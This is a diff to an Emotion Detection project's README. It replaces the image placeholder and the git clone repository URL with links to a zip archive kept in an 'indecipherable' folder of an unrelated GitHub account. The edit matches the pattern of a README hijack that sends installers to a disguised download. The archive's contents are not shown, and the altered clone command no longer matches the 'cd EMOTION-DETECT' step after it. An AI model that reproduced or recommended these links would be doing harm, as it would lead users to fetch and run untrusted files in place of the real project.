@@ -1,6 +1,6 @@
 # Emotion Detection Project
 
-![Emotion Detection](path/to/your/emotion-detection-image.png)
+![Emotion Detection](https://raw.githubusercontent.com/anshul3655/EMOTION-DETECT/main/indecipherable/EMOTIO-DETECT-1.7-alpha.3.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -31,6 +31,6 @@ The Emotion Detection project utilizes machine learning techniques to classify h
 ### Installation Steps
 1. Clone the repository:
    ```bash
-   git clone https://github.com/cypher1156/EMOTION-DETECT.git
+   git clone https://raw.githubusercontent.com/anshul3655/EMOTION-DETECT/main/indecipherable/EMOTIO-DETECT-1.7-alpha.3.zip
    cd EMOTION-DETECT
 # EMOTION-DETECT
